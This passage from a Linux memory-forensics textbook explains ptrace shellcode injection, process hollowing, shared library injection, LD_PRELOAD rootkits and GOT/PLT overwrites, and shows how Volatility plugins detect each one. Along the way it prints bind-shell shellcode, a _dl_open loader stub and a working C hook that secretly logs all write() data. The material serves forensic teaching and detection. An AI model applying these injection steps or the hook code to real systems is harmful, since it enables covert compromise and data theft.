To use payloads more than a handful of bytes in size, malware must be able to allocate large regions within the target process. Because Linux does not provide a function for allocating memory in a foreign process, such as Microsoft’s `VirtualAllocEx`, the malicious program must typically allocate memory in two steps. In particular, it uses one of the aforementioned techniques to inject a small shellcode stub whose sole purpose is to allocate a larger memory region by calling `mmap` after it is inside the target process’ address space.

Historically, malware used `malloc` to allocate memory for shellcode on the heap, but 32-bit Physical Address Extension (PAE) and 64-bit systems contain non-executable stacks and heaps. Thus, on modern systems, the only function available that meets the necessary allocation criteria is `mmap`, which allows for not only allocating memory but also setting its page permissions. By using `mmap`, the malware can allocate memory and specify the protection as readable, writable, and executable. Once the first stage shellcode calls `mmap` within the target process, the real payload can then be written to the newly allocated (large) region and executed.

---

**NOTE**

The inability to allocate memory as writable and executable is one of the restrictions imposed by the `MPROTECT` feature of the PaX-kernel-hardening patches from Grsecurity ([http://pax.grsecurity.net/docs/mprotect.txt](http://pax.grsecurity.net/docs/mprotect.txt)). From the documentation guide, the operations prevented are these:

- Creating executable anonymous mappings
- Creating executable/writable file mappings
- Making an executable/read-only file mapping writable except for performing relocations on an `ET_DYN ELF` file (non–position independent code [PIC] shared library)
- Making a non-executable mapping executable

These restrictions prevent processes from allocating regions that could potentially contain executable shellcode.

---

### Step 3: Writing Shellcode into a Process

After the malware finds a suitable location (using one of the previous methods), `PTRACE_POKETEXT` can be used to write the shellcode into the foreign process. Since the 3.2 kernel version, Linux has provided two functions, `process_vm_readv` and `process_vm_writev`, that allow for reading and writing of a foreign process’ memory without the use of `ptrace`. Although it means that the use of `PTRACE_PEEKTEXT` and `PTRACE_POKETEXT` could be avoided, all the other `ptrace` functionality in this section is still required. Furthermore, because these system calls are relatively new at the time of writing, we have yet to see any malware in the wild use them.

### Step 4: Controlling Foreign Process Execution

After the shellcode exists in the target process’ memory, the malware must force it to execute. The easiest way to redirect program execution to the shellcode is to use the following algorithm:

1. Call `ptrace` with the `PTRACE_GETREGS` operation, which pauses the program and gives you a copy of all registers and their current values.
2. Overwrite the instruction pointer register so that it points to the shellcode.
3. Use `PTRACE_SETREGS` to update the registers within the foreign process.
4. Use `PTRACE_CONT` to resume the process.

When the program resumes, it then executes the injected shellcode. Of course, this method of overwriting can be destructive if executed within a critical thread and the instruction pointer is not reset after the shellcode block executes.

Another method to force execution is to read the current value of the instruction pointer, back up the instructions currently after it, copy the shellcode to the address pointed to by the instruction pointer, and then let the shellcode execute. If the shellcode is made to execute an `int 3` (software breakpoint) instruction after completing its tasks, the malware process takes control again. The malware process can then restore the backed-up instructions and let them execute. In this manner, the malicious code acts just like a debugger.

### Detecting Shellcode Injection

You can use the `linux_malfind` plugin to find shellcode that was injected into processes by allocating new regions. You can use the `linux_hollow_process` plugin, described later in this chapter, to detect skape’s technique of overwriting part of the existing `main` function with shellcode.

`linux_malfind` works similarly to its Windows counterpart (as described in the “Code Injection” section of Chapter 8) because it walks the memory mappings of a process looking for suspicious protection bits. In particular, it looks for mappings whose protection bits indicate that the region is readable, writable, and executable. This condition should not occur using standard process-loading mechanisms, but it might occur in userland applications that need to generate code at runtime, such as interpreters of dynamic languages (Perl, Python, and JavaScript).

To demonstrate how to use `linux_malfind`, a program named `inject` was used to inject code into a process named `target`. The injected payload spawns a backdoor shell that listens on TCP port 31337. The `inject` application uses the two-step procedure previously described. First, a small block of shellcode that calls `mmap` is injected by overwriting the beginning of the target process’ `main` function. This `mmap` shellcode allocates a page of memory at a hardcoded address (`0x1011000`) that is readable, writable, and executable. It then writes the payload into the allocated memory and executes it.

`linux_malfind` immediately picks up this injected segment due to its invalid protection bits:

```
$ python vol.py -f injtarget.lime --profile=LinuxDebian3_2x86 linux_malfind
Volatility Foundation Volatility Framework 2.4
Process: target Pid: 16929 Address: 0x1011000 File: Anonymous Mapping
Protection: VM_READ|VM_WRITE|VM_EXEC
Flags: VM_READ|VM_WRITE|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|VM_ACCOUNT

0x01011000  31 c0 31 db 31 c9 31 d2 b0 66 b3 01 51 6a 06 6a   1.1.1.1..f..Qj.j
0x01011010  01 6a 02 89 e1 cd 80 89 c6 b0 66 b3 02 52 66 68   .j........f..Rfh
0x01011020  7a 69 66 53 89 e1 6a 10 51 56 89 e1 cd 80 b0 66   zifS..j.QV.....f
0x01011030  b3 04 6a 01 56 89 e1 cd 80 b0 66 b3 05 52 52 56   ..j.V.....f..RRV

0x1011000 31c0             XOR EAX, EAX
0x1011002 31db             XOR EBX, EBX
0x1011004 31c9             XOR ECX, ECX
0x1011006 31d2             XOR EDX, EDX
0x1011008 b066             MOV AL, 0x66
0x101100a b301             MOV BL, 0x1
0x101100c 51               PUSH ECX
0x101100d 6a06             PUSH 0x6
0x101100f 6a01             PUSH 0x1
0x1011011 6a02             PUSH 0x2
0x1011013 89e1             MOV ECX, ESP
0x1011015 cd80             INT 0x80
0x1011017 89c6             MOV ESI, EAX
0x1011019 b066             MOV AL, 0x66
0x101101b b302             MOV BL, 0x2
0x101101d 52               PUSH EDX
0x101101e 66687a69         PUSH WORD 0x697a
<snip>
```

As shown in the output, the target process (PID 16929) has a region of memory at address `0x1011000` that is readable, writable, and executable. The `mmap` shellcode initially allocates this region. You can also use `linux_netstat` to see that the shellcode successfully created the backdoor network socket:

```
$ python vol.py -f injtarget.lime --profile=LinuxDebian3_2x86 
   linux_netstat -p 16929
Volatility Foundation Volatility Framework 2.4
TCP      0.0.0.0:31337 0.0.0.0:0     LISTEN            target/16929
```

In an investigation, you could now begin to study the disassembly of the shellcode to determine which capabilities it provides for the attacker.

## Process Hollowing

Process hollowing is the act of overwriting a process or portions of a process in memory with malicious code. Attackers often use process hollowing to hide the presence of malware on a system because tools that list processes see a legitimate process instead. Also, the in-kernel data structures for the process will report the path to the original process’ binary (for example, `/usr/bin/apache2`), not to the malware’s file. This misdirection makes antivirus and other host-protection tools scan innocent files on disk and lets the malware further evade detection.

---

**NOTE**

On the Windows side, infamous malware samples, such as Stuxnet and Careto (The Mask), used process hollowing to evade detection on live systems.

---

### The Detection Algorithm

Process-hollowing detection relies on having a known good copy of an application’s instructions to compare with those in memory. Although you *could* consult the kernel’s file cache (see Chapter 24) to obtain a copy of the file as it appears on disk, the desired file might not exist in the cache or it might be incomplete (due to swapping). Furthermore, you cannot trust that files on a compromised system’s disk are the original, unmodified versions.

Because of these issues, Volatility relies on a copy of the file from a baseline disk image (or installation package) to obtain the known good data. Thus, provided that you have the ability to obtain a trusted copy of the potentially “infected” file(s), you can use the `linux_process_hollow` plugin to perform the check. This plugin requires three options:

- The path to the trusted binary file
- The PID(s) to operate on
- The address that the application is mapped into the process’ memory

The plugin starts by reading the symbol table of the trusted file and determining where each function is loaded into memory. It then compares each function with the actual code in memory. Except for the case of direct relocations, which do not use the GOT/PLT (they overwrite function addresses at runtime), the code of an application should not change. Volatility detects the direct relocations by parsing the relocation table and accounts for them to avoid false positives.

---

**NOTE**

The current implementation only operates on one process at a time. However, remember that Volatility is open source and extensible. You can update the code so that it obtains the full paths on disk to loaded processes, shared libraries, and kernel modules; then automate the comparison with the corresponding files from your baseline disk image or install media.

---

### An Example of Detection

The following scenario involves a system infected with malware that performs process hollowing (and also shared library injection, which we discuss in the next section). The target process is an instance of bash and its PID is 18550, as the first command shows:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
    linux_pslist | grep bash
Volatility Foundation Volatility Framework 2.4
Offset     Name    Pid   Uid   Gid  DTB        Start Time
------------------ ----- ----- ---- ---------  ----------------------------
0xf7116140 bash   18550 0     0    0x35acd000 2014-02-25 12:09:19 UTC+0000
```

The next command determines the address of where the target ELF file is loaded in process memory. According to the output, the executable region (`r-x`) starts at `0x80480000`. You also see the full path to the binary on disk (`/bin/bash`).

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
       linux_proc_maps -p 18550 | grep bash
Volatility Foundation Volatility Framework 2.4
Pid   Start     End       Flags Pgoff Major Minor  Inode  File Path
----- --------- --------- ----- ----  ----- ------ ------ -------------------
18550 0x8048000 0x8049000 r-x   0x0   8     1      948592 /bin/bash
18550 0x8049000 0x804a000 rw-   0x0   8     1      948592 /bin/bash
```

We then pass this information to `linux_process_hollow` along with the path to the trusted copy of the executable (`/mnt/baselines/bin/bash`). The plugin reports that the `main` function has been altered:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
       linux_process_hollow -p 18550 
       -b 0x8048000 –P /mnt/baselines/bin/bash
Volatility Foundation Volatility Framework 2.4
Task     PID  Symbol Name Symbol Address
-------- ---- ----------- --------------
bash    18550 main        0x80485bc
```

If we investigate the symbol address with `linux_volshell`, we find a block of instructions and a string reference to `/tmp/.XICE-unix`:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 linux_volshell
Volatility Foundation Volatility Framework 2.4
Current context: process init, pid=1 DTB=0x370bf000
Welcome to volshell! 
To get help, type 'hh()'
>>> cc(pid=18550)
Current context: process bash, pid=18550 DTB=0x35acd000
>>> db(0x80485bc, 48)
0x080485bc  eb 17 58 89 04 24 c7 44 24 04 01 00 00 00 bb e0   ..X..$.D$.......
0x080485cc  3a 75 b7 ff d3 83 c4 04 cc e8 e4 ff ff ff 2f 74   :u............/t
0x080485dc  6d 70 2f 2e 58 49 43 45 2d 75 6e 69 78 00 00 00   mp/.XICE-unix...
>>> dis(0x80485bc)
0x80485bc eb17                             JMP 0x80485d5
0x80485be 58                               POP EAX
0x80485bf 890424                           MOV [ESP], EAX
0x80485c2 c744240401000000                 MOV DWORD [ESP+0x4], 0x1
0x80485ca bbe03a75b7                       MOV EBX, 0xb7753ae0
<snip>
```

A `JMP` instruction has replaced code that should correspond to the `main` function. Typically you would see a function prologue such as `PUSH EBP`, followed by `MOV EBP, ESP`. In this case, however, the CPU is redirected to the code at address `0x80485d5`, which is further along in the injected shellcode. The exact operation of this shellcode is explained in the following section.

## Shared Library Injection

Injecting shellcode into a process is very useful for attackers during initial exploitation and for *limited* post-compromise activities. However, writing full-featured software purely in shellcode is difficult because it must be position-independent (that is, no hardcoded addresses) and cannot directly rely on API calls. To remedy this situation, many programmers choose to implement their backdoors as shared libraries instead, which they can write in C.

As this section describes, attackers have two methods in which to inject libraries into a foreign process. The first method, which is the simplest, uses the native system APIs to load the attacker’s shared library stored on disk into the address space of another process. However, this technique leaves a number of traces throughout memory and disk. The second method loads a library that is located only in memory and never writes it to disk. This method is more difficult to implement, but it leaves far fewer artifacts in memory and no artifacts on disk.

### Injecting a Library from Disk

The Linux dynamic loader provides functions such as `dlopen`, `dlclose`, and `dlsym`, which are equivalent to the Windows functions `LoadLibrary`, `FreeLibrary`, and `GetProcAddress`, respectively. Together they allow programmers to load libraries, unload libraries, and query symbol addresses within libraries at runtime. To inject a shared library stored on disk into a foreign process, all the malicious process must do is force the target process to call `_dlopen` (a function that `dlopen` wraps) with its first parameter set to the path of the shared library.

---

**NOTE**

`_dlopen` is used instead of `dlopen` because `dlopen` is present only in applications that programmatically interact with the runtime loader. On the other hand, `_dlopen` is within `libc` and loads into the address space of all dynamically linked applications. On some recent versions of `libc`, `_dlopen` has also been deprecated and replaced with `__libc_dlopen_mode`. The same process can be used to call this function in all dynamically linked applications and is used by projects such as injectso64 ([https://github.com/ice799/injectso64](https://github.com/ice799/injectso64)).

---

To the best of our knowledge, the first public documentation of this technique was in *Runtime Process Infection* ([http://phrack.org/issues/59/8.html](http://phrack.org/issues/59/8.html)). In this article, the author used the previously described `ptrace` technique to inject shellcode into the process and then execute it. The shellcode subsequently loaded a library like this:

```
1   _start:    jmp string
2   
3   begin:     pop    eax                   ; char *file
4              xor    ecx     ,ecx          ; *caller
5              mov    edx     ,0x1          ; int mode
6
7              mov    ebx,    0x12345678    ; addr of _dl_open()
8              call   ebx                   ; call _dl_open!
9              add    esp,    0x4
10  
11             int3                         ; breakpoint
12  
13  string: call begin
14          db "/tmp/ourlibby.so",0x00
```

On line 1, the shellcode jumps to the `string` label on line 13. The `call begin` instruction then transfers control back up to line 3. This redirection has the effect of placing the address of the `/tmp/ourlibby.so` string (the path of the library to be loaded) on the top of the stack. Thus, when line 3 performs a `pop eax`, the string’s address is copied into the `EAX` register and becomes the first argument to `_dl_open`. Line 7 holds a dummy value for the address of `_dl_open`, which is patched at runtime with the real address of the function within the target process. On line 8, `_dl_open` is called, and on line 11 `int 3` is executed to return control to the malicious process.

#### Detecting Disk–Based Shared Library Injections

You can detect disk–based shared library injections by using a number of methods. Because the malicious library is loaded in the same manner (that is, with `_dlopen`) as legitimate libraries, the kernel populates data structures for the mapped file. Thus, you can use the `linux_proc_maps` plugin for detection. In this case, malware injected a library named `/tmp/.XICE-unix` into the target process. This filename is intentionally misleading because most Linux distributions have a directory named `/tmp/.ICE-unix` (created by the X server):

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
    linux_proc_maps -p 18550
Volatility Foundation Volatility Framework 2.4
Pid      Start    End         Flags  Pgoff Major  Minor  Inode     File Path
-------- -------- ----------- ------ ----- ----- ------ ---------- -------
<snip>
   18550 0xb77b1000 0xb77b2000 r-x   0x0   8      1     1439419 /tmp/.XICE-unix
   18550 0xb77b2000 0xb77b3000 rw-   0x0   8      1     1439419 /tmp/.XICE-unix
<snip>
```

---

**NOTE**

Linux makes two mappings for each mapped application or library. One is for the executable data (note the `r-x` protection), and the other is for the data mapping (`rw-` protection).

---

In this output, an abnormal library has obviously been mapped into the process because it loads from `/tmp` instead of `/lib` or `/usr/lib`. Although different applications might load libraries from outside of the `lib` directories, you typically won’t see them in temporary paths. Another way to spot discrepancies is to filter these entries based on a whitelist of known good values. For example, create baselines of disk images and modify the plugin to alert only on libraries not in your baseline.

#### Listing Libraries in Userland

Volatility has a plugin, `linux_library_list`, which is specifically designed to report libraries mapped into a process. In particular, it analyzes the list of loaded libraries that the dynamic linker in userland maintains. This is very similar to the list of dynamic link libraries (DLLs) kept in the Process Environment Block (PEB) on Windows (see Chapters 7 and 8). In this list, each mapping is represented by a `link_map` structure, which maintains the starting address and file system path of libraries mapped using functions such as `dlopen`. The presence and enumeration of this list was first presented by the grugq ([http://www.ouah.org/melfbuggery.html](http://www.ouah.org/melfbuggery.html)).

The following command shows `linux_library_list` against the process infected by the `/tmp/.XICE-unix` malicious library:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
    linux_library_list -p 18550
Volatility Foundation Volatility Framework 2.4
Task             Pid      Load Address Path
---------------- -------- ------------ ----
bash              18550   0x00b7647000 /lib/i386-linux-gnu/i686/cmov/libc.so.6
bash              18550   0x00b77b7000 /lib/ld-linux.so.2
bash              18550   0x00b77b1000 /tmp/.XICE-unix
[snip]
```

In this output, you can see the shared libraries loaded into the process, including the malicious library.

#### Cross-Referencing Mappings

The `linux_ldrmodules` plugin automatically cross-references libraries found through the kernel’s list of per–process memory mappings and the doubly linked list of libraries kept by the dynamic linker. This plugin can detect malware that hides by manipulating the dynamic linker’s list (a common technique used to hide from debuggers and other live tools). Again, this attack is very similar to malware tactics seen on Windows systems that alter the list of DLLs kept in userland. You can also use the `linux_ldrmodules` plugin to detect libraries injected solely in memory (discussed in the next section).

In order to determine which of the kernel mappings hold shared libraries, the plugin checks the beginning of each mapping for the ELF file header. If the ELF header is found and the mapping protections have the execute bit set, the mapping is reported. This has the side effect of finding all ELF files, including the main process. The following shows `linux_ldrmodules` against the process with the `.XICE-unix` library injected:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
    linux_ldrmodules -p 18550
Volatility Foundation Volatility Framework 2.4
Pid   Name    Start      File Path                       Kernel  Libc
----- ------- ---------  -------------------             ------  ------
18550 bash    0x08048000 /bin/bash                        True   False
18550 bash    0xb7647000 /lib/[snip]/cmov/libc-2.13.so    True   True
18550 bash    0xb77b7000 /lib/i386-linux-gnu/ld-2.13.so   True   True
18550 bash    0xb77b1000 /tmp/.XICE-unix                  True   True
[snip]
```

The binary for the process (`/bin/bash`) is found only in process mappings. This is normal because it is not loaded through the dynamic linker. However, if you see `False` in the `Libc` column for any entry other than the process’ main binary, you should flag it for further investigation. You can always determine which entry corresponds to the process by matching the `task.mm.start_code` address with the address of the mapping.

As expected, the remaining entries are found in both lists, which indicates exactly how they were loaded (via `dlopen`). It also tells you that they aren’t hidden from the system in additional ways. Right now, `.XICE-unix` is hiding in plain sight, so to speak. If it tried to be extra stealthy by unlinking from the dynamic linker list in userland, you’d then see a discrepancy in this plugin’s output.

### Injecting a Library from Memory

To avoid the artifacts left by disk-based injections, particularly the library file and the corresponding `/proc/<pid>/maps` entries, attackers designed methods that can load applications and libraries directly from memory. When this technique was developed, no memory analysis capabilities existed within the forensics community. Thus, if attackers could avoid leaving artifacts on disk, they could often completely bypass detection by normal system administration tools as well as forensic analysis. The first papers to publicly explore this idea on Linux were the following:

- *The Design and Implementation of Userland Exec* by the grugq: [https://github.com/grugq/grugq.github.com/blob/master/docs/ul_exec.txt](https://github.com/grugq/grugq.github.com/blob/master/docs/ul_exec.txt). This technique focused on imitating the functionality of `execve` entirely in user mode, which allowed processes to be created without involving the kernel. Thus, an application could be launched right off the network instead of being written to disk first. Despite being published in 2004, this technique to execute an application solely in memory is still used in the wild.
- *Remote Library Injection* by skape: [http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf](http://www.nologin.org/Downloads/Papers/remote-library-injection.pdf). This technique involves using `mmap` to allocate a readable, writable, and executable memory region in the target process to store the malicious library’s code. It relies on hooking the dynamic loader’s API functions (for example, `open`, `read`, `lseek`, `mmap`, `fxstat64`) so that they work on the binary already loaded into memory instead of a file on disk. It then calls `_dl_open`, which runs using modified routines.

You can detect memory-only injections in a number of ways. The first is by using `linux_malfind`. As discussed in “Detecting Shellcode Injection,” the mappings that contain shellcode must be writable and executable. Thus, `linux_malfind` will flag this suspicious set of protections. All the methods published for loading an executable directly from memory use shellcode to at least allocate a suitable memory region in the target process, if not for other purposes as well.

Even if the malware frees its shellcode region after its library is loaded, you can detect the library in several ways. For example, skape’s technique uses `_dl_open` (albeit a hooked version), so it still populates the list of libraries that the loader keeps, making the library visible to `linux_library_list`. If the loader’s list of libraries is tampered with, `linux_ldrmodules` flags the malware because the injected library appears as `True` in kernel mappings, but `False` in the dynamic linker’s mappings. A similar discrepancy exists if the `execve` method described by the grugq is used because it does not rely on calling `_dl_open`. Thus, the injected application is never created in the dynamic linker list in the first place. However, it contains an ELF header, so the `linux_ldrmodules` method can find it.

### Extracting Executables from Memory

You will often want to extract executables and shared libraries from memory to statically analyze them. To automate this process, the `linux_procdump` and `linux_librarydump` plugins were created to mimic their Windows counterparts, `procdump` and `dlldump`.

The main purpose of these plugins is to extract executables in their native ELF form, not just as regions of disjointed memory, which would happen if you use `linux_dump_maps`. To accomplish this, the Volatility API provides a function that takes a `task_struct` and the virtual address of an ELF header as parameters. It then acquires the process address space of the given `task_struct` and instantiates an `elf_hdr` object at the given virtual address.

To find the sections to extract, the program headers of the file are enumerated, and those of type `PT_LOAD` are saved. `PT_LOAD` sections are loaded into memory upon program execution or library initialization. If you examine the program headers of a file on disk, you see that all the important sections are contained within one of two `PT_LOAD` sections. In a normal ELF binary, one section is for executable data and the other is for writable data:

```
$ readelf -Wl /bin/ls

Elf file type is EXEC (Executable file)
Entry point 0x404880
There are 9 program headers, starting at offset 64

Program Headers:
  Type           Offset   VirtAddr PhysAddr FileSiz  MemSiz   Flg Align
  PHDR           0x000040 0x400040 0x400040 0x0001f8 0x0001f8 R E 0x8
  INTERP         0x000238 0x400238 0x400238 0x00001c 0x00001c R   0x1
       [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
LOAD           0x000000 0x400000 0x400000 0x01a60c 0x01a60c R E 0x200000
LOAD           0x01adb0 0x61adb0 0x61adb0 0x0007cc 0x001550 RW  0x200000
  DYNAMIC        0x01adc8 0x61adc8 0x61adc8 0x000210 0x000210 RW  0x8
  NOTE                 0x000254 0x400254 0x400254 0x000044 0x000044 R   0x4
  GNU_EH_FRAME   0x017e28 0x417e28 0x417e28 0x00070c 0x00070c R   0x4
  GNU_STACK      0x000000 0x000000 0x000000 0x000000 0x000000 RW  0x8
  GNU_RELRO      0x01adb0 0x61adb0 0x61adb0 0x000250 0x000250 R   0x1

  Section to Segment mapping:
   Segment Sections...
    00
    01     .interp
02     .interp .note.ABI-tag .note.gnu.build-id .hash .gnu.hash .dynsym 
    .dynstr.gnu.version .gnu.version_r .rela.dyn .rela.plt .init  
    .plt .text .fini .rodata .eh_frame_hdr .eh_frame
    03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss
    04     .dynamic
    05     .note.ABI-tag .note.gnu.build-id
    06     .eh_frame_hdr
    07
    08     .init_array .fini_array .jcr .dynamic .got
```

In the Program Headers portion, you see two `LOAD` segments in bold. These two entries correspond to segments 02 and 03 in the Section to Segment mapping section, since the mappings leverage zero-based numbering. The first `LOAD` segment is readable and executable, and its section-to-segment mapping includes expected sections such as `.text`, `.plt`, and `.init`. The other `LOAD` segment is the readable and writable one, and its section-to-segment mapping includes the `.data` and `.bss` sections. So when executables are extracted from memory, the `LOAD` segments will have nearly all of the important sections. The ones missing are those useful for debugging but not needed at runtime, such as the static symbol table and section information.

The following commands show how to use `linux_librarydump` to recover the `.XICE-unix` shared library:

```
$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
       linux_proc_maps -p 18550 | grep ICE
Volatility Foundation Volatility Framework 2.4
   18550 0xb77b1000 0xb77b2000 r-x   0x0   8   1    1439419 /tmp/.XICE-unix
   18550 0xb77b2000 0xb77b3000 rw-   0x0   8   1    1439419 /tmp/.XICE-unix

$ python vol.py -f sharedlib.lime --profile=LinuxDebian3_2x86 
       linux_librarydump -p 18550 
       -D outdir -b 0xb77b1000
Volatility Foundation Volatility Framework 2.4
Offset     Name        Pid       Address    Output File
---------- ----------- --------- ---------- -----------
0xf7116140 bash        18550     0xb77b1000 outdir/bash.18550.0xb77b1000

$ file outdir/bash.18550.0xb77b1000
outdir/bash.18550.0xb77b1000: ELF 32-bit LSB shared object, Intel 80386, 
version 1 (SYSV), dynamically linked, 
BuildID[sha1]=0x8200585e3443980847707c3f63eaa38f531fb67a, not stripped
```

The library is extracted from memory successfully and can then be analyzed using reverse-engineering techniques.

## LD_PRELOAD Rootkits

You can achieve a special version of shared library injection by using the `LD_PRELOAD` facility provided by the dynamic loader. `LD_PRELOAD` is an environment variable that specifies the path to a shared library. Any program run with `LD_PRELOAD` set (except for those that are `setuid` for a different or higher privilege than the user) has the specified library loaded into its address space first. It is then easy to hook API functions from any other library within the process’ address space because symbols are resolved within the preloaded library first. Itzik Kotler first published this technique in his article, *Reverse Engineering with LD_PRELOAD*: [http://securityvulns.com/articles/reveng](http://securityvulns.com/articles/reveng).

### Hooking Functions with LD_PRELOAD

The following code shows an example of a simple library that could be used in conjunction with the `LD_PRELOAD` technique to hook the `write` library call. This hook allows the rootkit to intercept data as it is written to disk, across the network, or to an output terminal:

```
  1 #include <stdio.h>
  2 #include <dlfcn.h>
  3 #include <unistd.h>
  4 #include <fcntl.h>
  5
  6 ssize_t (*orig_write)(int, const void *, size_t);
  7 int log_fd;
  8
  9 ssize_t write(int fd, const void *buf, size_t count)
 10 {
 11     void *handle;   
 12
 13     if (!orig_write)
 14     {
 15         handle = dlopen("libc.so.6", RTLD_LAZY);
 16         orig_write = dlsym(handle, "write");
 17         log_fd = open("/tmp/logfile.txt", O_CREAT|O_WRONLY, 0666);
 18     }
 19
 20     orig_write(log_fd, buf, count);
 21     return orig_write(fd, buf, count);
 22 }
```

Line 9 declares the fake `write` function. On line 15, it obtains a handle to `libc` in memory, which is the library that contains the legitimate `write` function. The next line then resolves the runtime address of the real `write` function by calling `dlsym`. This address is needed so that the real function can still be called when necessary. Line 17 opens a handle to the log file (`/tmp/logfile.txt`). On line 20, the buffer passed to `write` is logged to the malware’s log file, and on line 21 the original write is called with the given parameters. Applications using `write` are not notified of this modification, so they are unaware that the malware is recording all data. The same process can be applied to any function, such as the `read` call, in order to log data from the network or user input.

### Detecting LD_PRELOAD Rootkits

Rootkits that use `LD_PRELOAD` can be detected in a number of ways. To demonstrate, we’ll use a memory sample provided by the Second Look project ([http://secondlookforensics.com/linux-memory-images/](http://secondlookforensics.com/linux-memory-images/)). In particular, the machine was infected with Jynx2 ([http://www.blackhatlibrary.net/Jynx_Rootkit/2.0](http://www.blackhatlibrary.net/Jynx_Rootkit/2.0)), which is a popular open-source `LD_PRELOAD`-based rootkit.

---

**NOTE**

Azazel ([http://blackhatlibrary.net/Azazel](http://blackhatlibrary.net/Azazel)) is another open-source rootkit that uses the `LD_PRELOAD` trick.

---

#### Extracting Preload Files

Rootkits can force every process to preload a library by writing the path of the library to `/etc/ld.so.preload`. The dynamic loader checks this file when starting applications, and it subsequently loads the requested library; Jynx2 and Azazel both take this approach. To detect it, you can simply use `linux_find_file` or `linux_recover_filesystem` to read `/etc/ld.so.preload` from memory and then examine its contents:

```
$ python vol.py --profile=LinuxUbuntu1204x64 -f jynxkit.mem 
       linux_find_file -F /etc/ld.so.preload
Volatility Foundation Volatility Framework 2.4
Inode Number                  Inode
---------------- ------------------
          263883 0xffff88003be9b440

$ python vol.py --profile=LinuxUbuntu1204x64 -f jynxkit.mem 
       linux_find_file -i 0xffff88003be9b440 
       -O ld.so.preload
Volatility Foundation Volatility Framework 2.4

$ cat ld.so.preload
/XxJynx/jynx2.so
```

The full path to the malicious Jynx library (`/XxJynx/jynx2.so`) is found within the preload file. On normal systems, libraries shouldn’t typically be preloaded via this method. Thus, checking the content of `ld.so.preload` files can be a simple indicator of compromise. The following command searches all process mappings for the malicious library and counts the number of occurrences:

```
$ python vol.py --profile=LinuxUbuntu1204newx64 -f jynxkit.mem
     linux_proc_maps | grep -c /XxJynx/jynx2.so
Volatility Foundation Volatility Framework 2.4
364
```

This command shows that the Jynx library is mapped 364 times by various processes on the system.

#### Analyzing Preload Variables

A second method to force a shared library to load is by setting the `LD_PRELOAD` environment variable within a user’s bash preferences file (typically `.bashrc` or `.bash_profile`). As discussed in Chapter 21, this same technique was used to change the `PATH` variable of a user to force the execution of trojan binaries. Just as the `PATH` tampering can be detected with `linux_bash_env`, so can the `LD_PRELOAD` trick. The following example shows how this attack appears by examining an infected `netcat` process:

```
$ python vol.py -f ncpreload.lime --profile=LinuxDebian3_2x86 
    linux_psenv -p 14259
Volatility Foundation Volatility Framework 2.4
Name   Pid    Environment
nc     14259  TERM=xterm SHELL=/bin/bash SSH_CLIENT=192.168.174.1 51514 22 
LD_PRELOAD=/root/ldpre/netlib.so OLDPWD=/root SSH_TTY=/dev/pts/2 USER=root 
MAIL=/var/mail/root PATH=/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin PWD=/root/ldpre LANG=en_US.UTF-8 SHLVL=1 HOME=/root 
LOGNAME=root SSH_CONNECTION=192.168.174.1 51514 192.168.174.128 22 
_=/bin/nc /bin/nc 
```

`LD_PRELOAD` points to the malicious file on disk. You can easily automate finding all instances of this variable and subsequently invoke the `linux_librarydump` plugin to extract the libraries.

#### Checking the GOT/PLT

The next method to detect `LD_PRELOAD`-based rootkits involves checking for GOT/PLT overwrites. This process will be explained more in the next section, but the idea is that the GOT holds the addresses of functions that an application uses and can be tampered with to redirect control flow. This type of hooking is very similar to import and export address table hooks in Windows. Because the preloaded library is loaded first, the function pointers within the table point to the preloaded library, not the original (for example, `libc`).

#### Comparative Symbol Analysis

A detection method that can find `LD_PRELOAD` rootkits on a live system was posted on the Chokepoint blog in February 2014 ([http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html](http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html)). This detection method is interesting because it relies on the dynamic linker to determine inconsistencies. It works in the following manner:

1. It uses the `dlsym` function to request the address of a number of commonly hooked functions.
2. It then requests the same function from `dlsym` with the `RTLD_NEXT` flag set. This request tells the dynamic loader to skip the first library in which the symbol is found and look for it in the rest of the loaded libraries.
3. It compares the two results and determines whether a mismatch exists.

Keep in mind that each function should be exported by only one library. Thus, an obvious inconsistency occurs if multiple libraries export the same symbol. Using the Volatility library listing and symbol resolution API, this same technique could easily be ported into a plugin.

## GOT/PLT Overwrites

As discussed in Chapter 20, the GOT and PLT are involved in the mechanism that allows an application to call functions stored within other libraries. After symbol resolution, the entries within the GOT store the full runtime address of the resolved symbol. By overwriting these entries, malware can redirect calls to legitimate functions to code that malware controls. This redirection allows malware to manipulate any data that’s processed by the redirected functions.

### PLT Tampering

The first research publication that showed how to perform PLT overwriting was *Shared Library Redirection Via ELF PLT Infection* by Silvio Cesare ([http://phrack.org/issues/56/7.html](http://phrack.org/issues/56/7.html)). This article focused on infecting entries within a file on disk; however, the technique has also been used against ELF files in memory.

---

**NOTE**

Many exploits gain the capability to write to arbitrary addresses in memory and then target GOT entries to redirect control flow. For more information, see the following research papers:

- *Advances in Format String Exploitation* by gera and riq: [http://phrack.org/issues/59/7.html](http://phrack.org/issues/59/7.html)
- *w00w00 on Heap Overflows* by Matt Conover: [http://www.cgsecurity.org/exploit/heaptut.txt](http://www.cgsecurity.org/exploit/heaptut.txt)
- *Hackers Hut: Exploiting the Heap* by Andries Brouwer: [http://www.win.tue.nl/~aeb/linux/hh/hh-11.html](http://www.win.tue.nl/~aeb/linux/hh/hh-11.html)

---

Overwriting a GOT entry requires three capabilities:

- To read and write data in a foreign process
- To find the target GOT entry
- To find the address of the hook function within the target process’ address space

